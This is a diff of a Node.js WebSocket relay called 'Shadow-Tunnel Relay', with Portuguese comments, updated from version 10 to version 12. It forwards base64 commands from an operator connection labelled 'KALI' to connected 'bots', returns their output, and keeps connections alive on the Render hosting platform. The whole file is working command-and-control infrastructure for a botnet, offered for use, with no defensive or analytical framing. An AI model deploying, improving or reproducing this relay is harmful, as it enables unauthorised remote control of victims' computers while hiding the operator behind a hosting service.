@@ -1,58 +1,78 @@
-// ----------  SHADOW-TUNNEL RELAY v10  ---------- //
-// 1.  Trava conexões simultâneas  →  mantém  alive  com  ping
-// 2.  Aceita  qualquer  Origem  (Render  exige  isso)
-// 3.  Log  reduzido  →  não  estoura  limite  de  log  do  Render
-
+// ---------- SHADOW-TUNNEL RELAY v12 ---------- //
 const WebSocket = require('ws');
-const http      = require('http');
+const http = require('http');
 
-const server = http.createServer((_, r) => r.end('Shadow v10'));
-const wss    = new WebSocket.Server({ server, path:'/' });
+const server = http.createServer((_, res) => {
+    res.writeHead(200);
+    res.end('Gateway System Active');
+});
+
+const wss = new WebSocket.Server({ server });
 
 let KALI = null;
-const BOTS = new Map();                 // id  →  ws
+const BOTS = new Map();
 
 function rawSend(ws, data) {
-    if (ws && ws.readyState === ws.OPEN) ws.send(data);
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(data);
+    }
 }
 
 wss.on('connection', (ws, req) => {
-    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
-    if (!id) return ws.close(1008, 'missing id');
+    const urlParams = new URLSearchParams(req.url.split('?')[1]);
+    const id = urlParams.get('id');
+
+    if (!id) return ws.close(1008, 'ID Requerido');
 
     if (id === 'KALI') {
-        if (KALI) KALI.close();         // expulsa  Kali  antigo
+        if (KALI) KALI.close(); 
         KALI = ws;
-        console.log('[+] Kali ok');
-        BOTS.forEach((_, botId) => rawSend(KALI, JSON.stringify({t: 'bot', s: 'on', id: botId})));
+        console.log('[+] Operador KALI conectado.');
+        // Sincroniza bots já online
+        BOTS.forEach((_, botId) => {
+            rawSend(KALI, JSON.stringify({ t: 'bot', s: 'on', id: botId }));
+        });
     } else {
         BOTS.set(id, ws);
-        console.log(`[!] Bot ' + id);
-        rawSend(KALI, JSON.stringify({t: 'bot', s: 'on', id}));
+        console.log(`[!] Bot conectado: ${id}`);
+        if (KALI) rawSend(KALI, JSON.stringify({ t: 'bot', s: 'on', id: id }));
     }
 
-    ws.on('message', raw => {
-        if (ws === KALI) {                              // Kali  →  Bot
-            try {
+    ws.on('message', (raw) => {
+        try {
+            if (ws === KALI) {
                 const d = JSON.parse(raw);
                 const target = BOTS.get(d.to);
-                if (target) rawSend(target, d.cmd);     // cmd  já  vem  base64
-            } catch {}
-        } else {                                        // Bot  →  Kali
-            rawSend(KALI, JSON.stringify({t: 'res', f: id, d: raw.toString()}));
+                if (target) rawSend(target, d.cmd);
+            } else {
+                // Encaminha resposta do Bot para o Kali
+                if (KALI) {
+                    KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
+                }
+            }
+        } catch (e) {
+            console.log("Erro no relay de mensagens");
         }
     });
 
     ws.on('close', () => {
-        if (ws === KALI) { KALI = null; console.log('[-] Kali off'); }
-        else {
+        if (ws === KALI) {
+            KALI = null;
+            console.log('[-] Operador desligado.');
+        } else {
             BOTS.delete(id);
-            rawSend(KALI, JSON.stringify({t: 'bot', s: 'off', id}));
+            if (KALI) rawSend(KALI, JSON.stringify({ t: 'bot', s: 'off', id: id }));
         }
     });
 
-    // Keep-alive  (Render  mata  inativo  em  ~2  min)
-    const timer = setInterval(() => (ws.readyState === ws.OPEN ? ws.ping() : clearInterval(timer)), 30000);
+    // Anti-Idle para o Render não derrubar a conexão
+    const heartbeat = setInterval(() => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.ping();
+        } else {
+            clearInterval(heartbeat);
+        }
+    }, 25000);
 });
 
 server.listen(process.env.PORT || 10000);
